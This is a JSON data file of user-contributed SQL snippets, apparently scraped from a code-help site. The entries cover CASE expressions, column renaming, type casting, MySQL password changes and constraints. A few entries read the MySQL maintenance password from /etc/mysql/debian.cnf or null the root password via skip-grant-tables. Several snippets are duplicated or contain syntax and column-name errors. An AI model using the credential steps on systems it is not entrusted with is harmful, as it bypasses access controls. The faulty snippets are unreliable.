    "description": "-- find everyone with  first_name contains d case insensitive manner Make everthing either lower or upper case  SELECT FIRST_NAME , LAST_NAME  FROM EMPLOYEES  WHERE LOWER(FIRST_NAME) LIKE '%d%' ; \n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 459,
    "keyword": null,
    "link": null,
    "title": " case statement in oracle with multiple conditions examples",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 460,
    "keyword": null,
    "link": null,
    "title": " case statement in sql",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n-- Case Eg.) to retrive the MAX value of a Field  -- if there are entries for the Field in table MAX value will be returned  -- But if there is no entries at all for the Field in tabel MAX will return -- Null as the output. But Using Case When we can check it out return zero  -- or any other value if there is no enties for the Field in table.. SELECT  CASE   -- Like Switch Case \tWHEN -- First When condition  \t\t(MAX(BILLID) IS NULL) -- Condition  \tTHEN 1   -- output   (We can also add more When conditions like Above) ELSE -- When WHEN Condition not Satisfied Below will be Executed.  \t\t(MAX(BILLID)) -- output END  as MAXBILLID   from  DUAL; -- Final Output -- If there is no entry in the Field for the table -- BILLID --  1 -- If there are entries MAX of that Field value from the table -- BILLID -- 10\n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nselect  case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end as Person from Table.Names  select case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end Person from Table.Names\nChange query output depending on conditions. Example: Returns users and their subscriptions, along with a new column called activity_levels that makes a judgement based on the number of subscriptions. SELECT first_name, surname, subscriptions CASE WHEN subscriptions > 10 THEN 'Very active' WHEN Quantity BETWEEN 3 AND 10 THEN 'Active' ELSE 'Inactive' END AS activity_levels FROM users;\nCase Statement basically Like IF - THEN - ELSE statement.  The CASE statement goes through conditions and returns a value when the first condition is met and once a condition is true, it will stop reading and return the result. If no conditions are true, it returns the value in the ELSE clause.  If there is no ELSE part and no conditions are true, it returns NULL.  FOR EXAMPLE =  CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  Result would be 'B' since it is the first correct answer\n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 461,
    "keyword": null,
    "link": null,
    "title": " case when postgres",
    "description": "     CASE        WHEN condition_1  THEN result_1       WHEN condition_2  THEN result_2       [WHEN ...]       [ELSE else_result] END\nCASE WHEN condition THEN result      [WHEN ...]      [ELSE result] END \n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 462,
    "keyword": null,
    "link": null,
    "title": " case when switch in SQL",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n-- Case Eg.) to retrive the MAX value of a Field  -- if there are entries for the Field in table MAX value will be returned  -- But if there is no entries at all for the Field in tabel MAX will return -- Null as the output. But Using Case When we can check it out return zero  -- or any other value if there is no enties for the Field in table.. SELECT  CASE   -- Like Switch Case \tWHEN -- First When condition  \t\t(MAX(BILLID) IS NULL) -- Condition  \tTHEN 1   -- output   (We can also add more When conditions like Above) ELSE -- When WHEN Condition not Satisfied Below will be Executed.  \t\t(MAX(BILLID)) -- output END  as MAXBILLID   from  DUAL; -- Final Output -- If there is no entry in the Field for the table -- BILLID --  1 -- If there are entries MAX of that Field value from the table -- BILLID -- 10\n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nselect  case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end as Person from Table.Names  select case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end Person from Table.Names\n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 463,
    "keyword": null,
    "link": null,
    "title": " cast as decimal postgresql",
    "description": "cast (Non_Updated as decimal) / Total_Devices AS Percent_Failure \n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 464,
    "keyword": null,
    "link": null,
    "title": " cast float mysql",
    "description": "SELECT     integer_column + 0.0 AS float_column \n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 465,
    "keyword": null,
    "link": null,
    "title": " cast string to datetime mysql",
    "description": "SELECT STR_TO_DATE('2017-03-13T14:39:01.123','%Y-%m-%dT%H:%i:%s.%f');\n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 466,
    "keyword": null,
    "link": null,
    "title": " change column in mysql",
    "description": "ALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE table_name ADD [COLUMN] column_name column_definition [FIRST|AFTER existing_column];\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\n#Alter is used #alter table TableName change CurrentColumnName NewColumnName Specification(size); alter table TableName change name firstname varchar(30); \n",
    "reg_date": "2021-10-12T09:54:21.000Z"
  },
  {
    "id": 467,
    "keyword": null,
    "link": null,
    "title": " change column name in mysql",
    "description": "ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 468,
    "keyword": null,
    "link": null,
    "title": " change column name in sql",
    "description": "-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\nALTER TABLE table_name CHANGE COLUMN old_name TO new_name; \nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\nALTER TABLE nom_table RENAME COLUMN colonne_ancien_nom TO colonne_nouveau_nom\nMySQL: ALTER TABLE Customer CHANGE Address Addr char(50);  Oracle: ALTER TABLE Customer RENAME COLUMN Address TO Addr;\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 469,
    "keyword": null,
    "link": null,
    "title": " change column name mysql",
    "description": "ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nALTER TABLE `members` ADD COLUMN `credit_card_number` VARCHAR(25);\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 470,
    "keyword": null,
    "link": null,
    "title": " change column name mysql command line",
    "description": "ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nALTER TABLE `members` ADD COLUMN `credit_card_number` VARCHAR(25);\nALTER TABLE table_name CHANGE old_column_name new_column_name datatype(length);\nalter table product change price price_kg float;\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 471,
    "keyword": null,
    "link": null,
    "title": " change column name sql",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE `db_name`.`table_name`  \tCHANGE `current_column_name` `new_column_name` datatype(size) NOT NULL COMMENT '';\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 472,
    "keyword": null,
    "link": null,
    "title": " change column name sql server management studio",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nEXEC sp_RENAME 'table_name.old_name',  'new name',  'COLUMN'\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 473,
    "keyword": null,
    "link": null,
    "title": " change column names mssql",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 474,
    "keyword": null,
    "link": null,
    "title": " change data type in mysql",
    "description": "ALTER TABLE table_name  CHANGE COLUMN column_name column_name datatype; \n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 475,
    "keyword": null,
    "link": null,
    "title": " change database name psql 8",
    "description": "# Remember to check active connections to the db and close them ALTER DATABASE your_db_name RENAME TO new_name;\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 476,
    "keyword": null,
    "link": null,
    "title": " change database postgres",
    "description": "\\c DBNAME\npsql: \\connect DBNAME. or in short: \\c DBNAME.\nuser_name=# CREATE DATABASE testdatabase;  user_name=# \\c testdatabase  \n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 477,
    "keyword": null,
    "link": null,
    "title": " change date format in oracle query",
    "description": "select to_char(date_column,'YYYY-MM-DD') from table; \n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 478,
    "keyword": null,
    "link": null,
    "title": " change default maximum runtime mariadb from phpmyadmin",
    "description": "#Display value of max_connections show variables like \"max_connections\"; Variable_name   | Value ---------------------- max_connections | 120 #Change Value set global max_connections = 60000;\n",
    "reg_date": "2021-10-12T09:54:22.000Z"
  },
  {
    "id": 479,
    "keyword": null,
    "link": null,
    "title": " change filed order in mysql",
    "description": "ALTER TABLE Employees CHANGE COLUMN empName empName VARCHAR(50) AFTER department;\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 480,
    "keyword": null,
    "link": null,
    "title": " change magento database url usimg musql",
    "description": "UPDATE core_config_data SET value = 'http://www.hypernode.com/' WHERE path LIKE 'web/unsecure/base_url'; UPDATE core_config_data SET value = 'https://www.hypernode.com/' WHERE path LIKE 'web/secure/base_url'; \n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 481,
    "keyword": null,
    "link": null,
    "title": " change mysql password from command line",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\n# `SET PASSWORD FOR <user> = PASSWORD('<plaintext_password>')` is deprecated SET PASSWORD FOR <user> = '<plaintext_password>'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 482,
    "keyword": null,
    "link": null,
    "title": " change mysql root password",
    "description": "#First Login with administrative account (Even root itself)  mysql> use mysql; mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD(\"NewPassword\"); mysql> flush privileges;  #Now quit and login mysql> quit  mysql -u root -p #Click enter and It will prompt you to enter password #Just to be safe you should also still try to log in without entering a password\n$ sudo mysql -u root -p Enter password: (enter your root password)  mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_new_password'; mysql> FLUSH PRIVILEGES; mysql> exit;  then to confirm  mysql -u root -p  Enter password: ********  Success!!! \n-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nuse mysql;  update user set authentication_string=PASSWORD(\"mynewpassword\") where User='root';  flush privileges;  quit \n$ sudo cat /etc/mysql/debian.cnf Note the lines which read:  user     = debian-sys-maint password = blahblahblah Then:  $ mysql -u debian-sys-maint -p Enter password: // type 'blahblahblah', ie. password from debian.cnf  mysql> USE mysql mysql> SELECT User, Host, plugin FROM mysql.user; +------------------+-----------+-----------------------+ | User             | Host      | plugin                | +------------------+-----------+-----------------------+ | root             | localhost | auth_socket           | | mysql.session    | localhost | mysql_native_password | | mysql.sys        | localhost | mysql_native_password | | debian-sys-maint | localhost | mysql_native_password | +------------------+-----------+-----------------------+ 4 rows in set (0.00 sec)  mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> COMMIT;  // When you don't have auto-commit switched on Either:  mysql> ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password'; Or:  // For MySQL 5.7+ UPDATE mysql.user SET authentication_string=PASSWORD('new_password') where user='root'; Then:  mysql> FLUSH PRIVILEGES; mysql> COMMIT;  // When you don't have auto-commit switched on mysql> EXIT  $ sudo service mysql restart $ mysql -u root -p Enter password: // Yay! 'new_password' now works!\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 483,
    "keyword": null,
    "link": null,
    "title": " change mysql version to 5.7 in ubuntu",
    "description": "sudo apt install linuxbrew-wrapper  brew install mysql@5.7\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 484,
    "keyword": null,
    "link": null,
    "title": " change name of colum in sql table",
    "description": "EXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 485,
    "keyword": null,
    "link": null,
    "title": " change name of user mysql",
    "description": "                                     RENAME USER old_user1  TO new_user; \n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 486,
    "keyword": null,
    "link": null,
    "title": " change nls date format",
    "description": "-- Date format for session ALTER SESSION SET NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:54:23.000Z"
  },
  {
    "id": 487,
    "keyword": null,
    "link": null,
    "title": " change password in mysql",
    "description": "ALTER USER 'user-name'@'localhost' IDENTIFIED BY 'NEW_USER_PASSWORD';FLUSH PRIVILEGES;\nSET PASSWORD FOR 'user-name'@'localhost' = PASSWORD('NEW_USER_PASSWORD');FLUSH PRIVILEGES;\n-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nUPDATE mysql.user SET authentication_string = PASSWORD('NEW_USER_PASSWORD')WHERE User = 'user-name' AND Host = 'localhost';FLUSH PRIVILEGES;CopyCopyCopied!\nmysql -u root -pCopy\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 488,
    "keyword": null,
    "link": null,
    "title": " change permission to database mysql",
    "description": "UPDATE mysql.user SET Host='%' WHERE Host='localhost' AND User='username'; UPDATE mysql.db SET Host='%' WHERE Host='localhost' AND User='username';\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 489,
    "keyword": null,
    "link": null,
    "title": " change primary key sql",
    "description": "ALTER TABLE <Table_Name> DROP CONSTRAINT <constraint_name>  ALTER TABLE <Table_Name> ADD CONSTRAINT <constraint_name> PRIMARY KEY (<Column1>,<Column2>)\n-- NOTE: this is for SQL-Oracle specifically  -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner;  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner; \n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 490,
    "keyword": null,
    "link": null,
    "title": " change role postgres",
    "description": "# make 'dave' superuser and allow him to create databases ALTER ROLE dave WITH SUPERUSER; ALTER ROLE dave WITH CREATEDB;\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 491,
    "keyword": null,
    "link": null,
    "title": " change root password mysql",
    "description": "#First Login with administrative account (Even root itself)  mysql> use mysql; mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD(\"NewPassword\"); mysql> flush privileges;  #Now quit and login mysql> quit  mysql -u root -p #Click enter and It will prompt you to enter password #Just to be safe you should also still try to log in without entering a password\n$ sudo mysql -u root -p Enter password: (enter your root password)  mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_new_password'; mysql> FLUSH PRIVILEGES; mysql> exit;  then to confirm  mysql -u root -p  Enter password: ********  Success!!! \nuse mysql;  update user set authentication_string=PASSWORD(\"mynewpassword\") where User='root';  flush privileges;  quit \nALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; \n1. If you in skip-grant-tables mode in mysqld_safe:  mysql> UPDATE mysql.user SET authentication_string=null WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  and then, in terminal:  $ mysql -u root  in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';   2. Not in skip-grant-tables mode just in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\n#Change or update mysql root password #Go to win cmd and cd into C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin #Then type in the following: (password - current root password) mysqladmin -u root -p password newpass\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 492,
    "keyword": null,
    "link": null,
    "title": " change row in sql",
    "description": "                                                     UPDATE employees  SET      lastname = 'Hill' WHERE     employeeID = 3;\nUPDATE employees  SET      address = '1300 Carter St',     city = 'San Jose',     postalcode = 95125,     region = 'CA' WHERE     employeeID = 3; \nUPDATING ROW Update TableName set ColumnName = value where condition; update scrumteam set firstname =&lsquo;Martin' where EmployeeID='1'; update scrumteam set lastname =&lsquo;Murtin' where firstname='Tom&rsquo;; \n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 493,
    "keyword": null,
    "link": null,
    "title": " change schema of all tables postgres",
    "description": "DO $$DECLARE    p_table regclass; BEGIN    SET LOCAL search_path='xyz';    FOR p_table IN       SELECT oid FROM pg_class       WHERE relnamespace = 'xyz'::regnamespace         AND relkind = 'r'    LOOP       EXECUTE format('ALTER TABLE %s SET SCHEMA public', p_table);    END LOOP; END;$$;\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 494,
    "keyword": null,
    "link": null,
    "title": " change sql column from null to not null",
    "description": "ALTER TABLE   clients ALTER COLUMN   phone     NVARCHAR(20) NOT NULL; \nALTER TABLE [TABLE_NAME] CHANGE [COLUMN_NAME] [COLUMN_NAME] [COLUMN_TYPE] NOT NULL DEFAULT [DEFAULT];\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 495,
    "keyword": null,
    "link": null,
    "title": " change table schema sql server",
    "description": "USE AdventureWorks2012;   GO   ALTER SCHEMA HumanResources TRANSFER Person.Address;   GO   \n-- change schema from [dbo] to [exe] IF (NOT EXISTS (SELECT * FROM sys.schemas WHERE name = 'exe'))  BEGIN     EXEC ('CREATE SCHEMA [exe] AUTHORIZATION [dbo]') END  ALTER SCHEMA exe      TRANSFER dbo.Employees \n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 496,
    "keyword": null,
    "link": null,
    "title": " change table to innodb mysql",
    "description": "ALTER TABLE `tbl` ENGINE=INNODB\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 497,
    "keyword": null,
    "link": null,
    "title": " change varchar length mysql",
    "description": "ALTER TABLE emp MODIFY COLUMN name VARCHAR(100); \nSELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n",
    "reg_date": "2021-10-12T09:54:24.000Z"
  },
  {
    "id": 498,
    "keyword": null,
    "link": null,
    "title": " changing column names in sql query results",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nALTER TABLE table_name CHANGE COLUMN old_name TO new_name; \nSELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY AS \"Employee Salary\" FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\nMySQL: ALTER TABLE Customer CHANGE Address Addr char(50);  Oracle: ALTER TABLE Customer RENAME COLUMN Address TO Addr;\nSELECT data.column AS `Label`\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 499,
    "keyword": null,
    "link": null,
    "title": " char varchar nvarchar sql",
    "description": "1. char - is the SQL-92 synonym for character. Data is padded with blanks/spaces to fill the field size. Fixed length data type. 2. nchar - is the SQL-92 synonym for national char and national character. Fixed length data type. 3. varchar - is the SQL-92 synonym for character varying. Variable length data type. 4. nvarchar - is the SQL-92 synonym for national char varying and national character varying. Variable length data type.\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 500,
    "keyword": null,
    "link": null,
    "title": " cheatsheet for sql",
    "description": "Guys, are you looking for SQL cheatsheet, in pdf format :)  -> https://buggyprogrammer.com/sql-cheatsheet/\n# Finding Data Queries  # SELECT: used to select data from a database SELECT * FROM table_name;  # DISTINCT: filters away duplicate values and returns rows of specified column SELECT DISTINCT column_name;  # WHERE: used to filter records/rows SELECT column1, column2 FROM table_name WHERE condition; SELECT * FROM table_name WHERE condition1 AND condition2; SELECT * FROM table_name WHERE condition1 OR condition2; SELECT * FROM table_name WHERE NOT condition; SELECT * FROM table_name WHERE condition1 AND (condition2 OR condition3); SELECT * FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);  # ORDER BY: used to sort the result-set in ascending or descending order SELECT * FROM table_name ORDER BY column; SELECT * FROM table_name ORDER BY column DESC; SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC; SELECT TOP: used to specify the number of records to return from top of table SELECT TOP number columns_names FROM table_name WHERE condition; SELECT TOP percent columns_names FROM table_name WHERE condition;  # Not all database systems support SELECT TOP. The MySQL equivalent is the LIMIT clause SELECT column_names FROM table_name LIMIT offset, count;  # LIKE: operator used in a WHERE clause to search for a specific pattern in a column # % (percent sign) is a wildcard character that represents zero, one, or multiple characters # _ (underscore) is a wildcard character that represents a single character SELECT column_names FROM table_name WHERE column_name LIKE pattern;  LIKE &lsquo;a%&rsquo; # (find any values that start with &ldquo;a&rdquo;) LIKE &lsquo;%a&rsquo; # (find any values that end with &ldquo;a&rdquo;) LIKE &lsquo;%or%&rsquo; # (find any values that have &ldquo;or&rdquo; in any position) LIKE &lsquo;_r%&rsquo; # (find any values that have &ldquo;r&rdquo; in the second position) LIKE &lsquo;a_%_%&rsquo; # (find any values that start with &ldquo;a&rdquo; and are at least 3 characters in length) LIKE &lsquo;[a-c]%&rsquo; # (find any values starting with &ldquo;a&rdquo;, &ldquo;b&rdquo;, or &ldquo;c&rdquo;  # See more in the source link\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 501,
    "keyword": null,
    "link": null,
    "title": " check character count in sql",
    "description": "SELECT LEN('W3Schools.com');\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 502,
    "keyword": null,
    "link": null,
    "title": " check connections to database postgres",
    "description": "SELECT * FROM pg_stat_activity WHERE datname='db_name';\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 503,
    "keyword": null,
    "link": null,
    "title": " check constraint in sql",
    "description": "ALTER TABLE <table> ADD CONSTRAINT chk_val CHECK (col in ('yes','no','maybe'))\nCREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     City varchar(255),     CONSTRAINT CHK_Person CHECK (Age>=18 AND City='Sandnes') );\nCREATE TABLE test(     _id BIGINT PRIMARY KEY NOT NULL,     decision NVARCHAR(5),     CHECK (decision in ('yes','no','maybe')) );\n#For one column CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int CHECK (Age>=18) );\n#Add Check ALTER TABLE Persons ADD CONSTRAINT CHK_PersonAge CHECK (Age>=18 AND City='Sandnes');  #Drop Check  ALTER TABLE Persons DROP CHECK CHK_PersonAge;\n/*Adding Check constraint in sql server*/ ALTER TABLE (Table_Name) ADD CONSTRAINT (Constraint_Name) CHECK (Boolean_Expression) \n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 504,
    "keyword": null,
    "link": null,
    "title": " check constraint to check if date greater than todays date",
    "description": " ALTER TABLE donation ADD CONSTRAINT   chk_date CHECK (ddate >= CURRENT_DATE);\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 505,
    "keyword": null,
    "link": null,
    "title": " check current sequence value postgres",
    "description": "SELECT last_value FROM sequence_name;\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 506,
    "keyword": null,
    "link": null,
    "title": " check if database exists sql",
    "description": "SELECT SCHEMA_NAME   FROM INFORMATION_SCHEMA.SCHEMATA  WHERE SCHEMA_NAME = 'DBName' \n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 507,
    "keyword": null,
    "link": null,
    "title": " check if has alpha characters sql",
    "description": "WHERE my_field LIKE '%[a-zA-Z]%'\n",
    "reg_date": "2021-10-12T09:54:25.000Z"
  },
  {
    "id": 508,
    "keyword": null,
    "link": null,
    "title": " check if mysql is installed",
    "description": "# to check if mysql is installed: mysql --version\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 509,
    "keyword": null,
    "link": null,
    "title": " check if record exists mysql",
    "description": "-- Returns 1 if exists, 0 else SELECT EXISTS(SELECT 1 FROM my_table WHERE text LIKE '%something%');  SELECT  \tCASE  \t\tWHEN EXISTS(SELECT 1 FROM my_table WHERE text LIKE '%something%') = 1 THEN     \t\t'It exists'     \tELSE 'Does not exist' \tEND;\n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 510,
    "keyword": null,
    "link": null,
    "title": " check if sql temp table exists",
    "description": "IF OBJECT_ID('tempdb..#Results') IS NOT NULL DROP TABLE #Results\nIF OBJECT_ID('tempdb..#Results') IS NOT NULL     Truncate TABLE #Results else     CREATE TABLE #Results     (         Company             CHAR(3),         StepId              TINYINT,         FieldId             TINYINT,     ) \n",
    "reg_date": "2021-10-12T09:54:26.000Z"
  },
  {
    "id": 511,
    "keyword": null,
    "link": null,
    "title": " check if string contains substring sql",
